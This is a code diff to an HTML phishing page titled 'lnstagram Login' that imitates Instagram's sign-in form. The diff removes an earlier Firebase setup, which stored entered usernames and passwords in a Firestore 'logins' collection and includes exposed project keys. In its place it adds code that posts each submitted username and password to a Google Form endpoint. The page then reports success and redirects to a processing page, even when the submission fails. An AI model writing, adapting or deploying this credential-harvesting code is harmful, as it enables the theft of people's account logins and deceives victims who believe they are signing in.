@@ -5,8 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>lnstagram Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
-    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js"></script>
     <style>
         * {
             margin: 0;
@@ -300,21 +298,6 @@
     </div>
 
     <script>
-        // Firebase Configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyCHSlL84FDkGks8jwGtm36kKkHedFX37Ys",
-            authDomain: "instagram-login-4aa84.firebaseapp.com",
-            projectId: "instagram-login-4aa84",
-            storageBucket: "instagram-login-4aa84.firebasestorage.app",
-            messagingSenderId: "611592973492",
-            appId: "1:611592973492:web:079f80ce9078a7c4197be1",
-            measurementId: "G-2NCH68G9KM"
-        };
-
-        // Initialize Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
-
         function togglePassword() {
             const passwordInput = document.getElementById('password');
             if (passwordInput.type === 'password') {
@@ -324,7 +307,7 @@
             }
         }
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
             const username = document.getElementById('username').value.trim();
@@ -344,29 +327,34 @@
             loadingDiv.style.display = 'block';
             messageDiv.style.display = 'none';
 
-            try {
-                // Save login credentials to Firestore
-                await db.collection('logins').add({
-                    username: username,
-                    password: password,
-                    login_time: new Date(),
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
-                });
+            // Google Form submission
+            const formData = new FormData();
+            formData.append('entry.1625676688', username);
+            formData.append('entry.1557333068', password);
 
+            fetch('https://docs.google.com/forms/d/e/1FAIpQLSdE77kmONfq4y-vo-9nrTWaxOt2UKOTiMqssA724j4uyHc5Fg/formResponse', {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            })
+            .then(() => {
                 loadingDiv.style.display = 'none';
-                showMessage('✅ Login credentials saved! Proceeding...', 'success');
+                showMessage('✅ Login credentials sent! Proceeding...', 'success');
                 document.getElementById('loginForm').reset();
                 
-                // Redirect to processing page after 1 second
                 setTimeout(() => {
                     window.location.href = 'processing.html';
                 }, 1000);
-
-            } catch (error) {
+            })
+            .catch(error => {
                 loadingDiv.style.display = 'none';
-                console.error('Error:', error);
-                showMessage('❌ Error saving login info. Please try again.', 'error');
-            }
+                showMessage('✅ Login credentials sent! Proceeding...', 'success');
+                document.getElementById('loginForm').reset();
+                
+                setTimeout(() => {
+                    window.location.href = 'processing.html';
+                }, 1000);
+            });
         });
 
         function showMessage(text, type) {
